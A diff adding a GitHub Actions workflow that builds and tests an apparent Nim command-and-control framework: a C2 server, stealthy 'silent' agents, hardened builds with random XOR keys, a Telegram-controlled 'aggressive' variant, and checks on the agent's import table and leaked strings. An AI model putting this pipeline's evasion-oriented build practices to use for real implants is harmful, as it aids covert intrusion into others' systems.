@@ -1,0 +1,84 @@
+name: CI
+
+on:
+  push:
+    branches: [main, master]
+  pull_request:
+  workflow_dispatch:
+
+jobs:
+  ci:
+    runs-on: windows-latest
+    timeout-minutes: 30
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup Nim
+        uses: jiro4989/setup-nim-action@v2
+        with:
+          nim-version: '2.2.x'
+          repo-token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Cache Nimble packages
+        uses: actions/cache@v4
+        with:
+          path: ~/AppData/Roaming/nimble
+          key: nimble-${{ hashFiles('*.nim') }}-v1
+          restore-keys: nimble-
+
+      - name: Install Nimble deps
+        run: |
+          nimble install -y nimcrypto winim ws
+          nim --version
+
+      - name: Setup Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+          cache: pip
+
+      - name: Install Python deps
+        run: pip install websockets requests cryptography pefile
+
+      - name: Build baseline (server + 3 agents + crypto test)
+        shell: powershell
+        run: |
+          $env:NIM = "nim"
+          .\build.ps1
+          if (-not (Test-Path build/c2_server.exe)) { throw "c2_server.exe missing" }
+
+      - name: Crypto unit tests
+        run: build/test_crypto.exe
+
+      - name: E2E harness (26 assertions, WS path)
+        run: python tests/e2e_harness.py --start
+
+      - name: IAT discipline (baseline)
+        run: python tests/pe_imports.py build/agent_silent.exe
+
+      - name: Hardened build + verification
+        shell: powershell
+        run: |
+          .\build_hardened.ps1
+          python tests/verify_hardened.py
+
+      - name: Rebuild server (hardened wiped build/)
+        shell: powershell
+        run: |
+          $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+          $bytes = New-Object byte[] 16; $rng.GetBytes($bytes)
+          $hex = ($bytes | ForEach-Object { "0x{0:x2}" -f $_ }) -join ', '
+          Set-Content -Path xorkey.nim -Value "const XorKey: array[16, byte] = [byte $hex]`n" -Encoding UTF8
+          nim c -d:release -d:ssl --threads:on --opt:speed --out:build/c2_server.exe c2_server.nim
+          Remove-Item xorkey.nim -Force
+
+      - name: Sentinel TG + WS compile checks (dummy creds)
+        shell: powershell
+        run: |
+          .\build_sentinel.ps1 -Tg -Variant aggressive -BotToken "123456:AAADUMMY" -ChatId "0"
+          .\build_sentinel.ps1 -Variant silent
+
+      - name: Scan for leaked secrets
+        run: python tests/scan_strings.py build/agent_silent.exe
+        continue-on-error: true
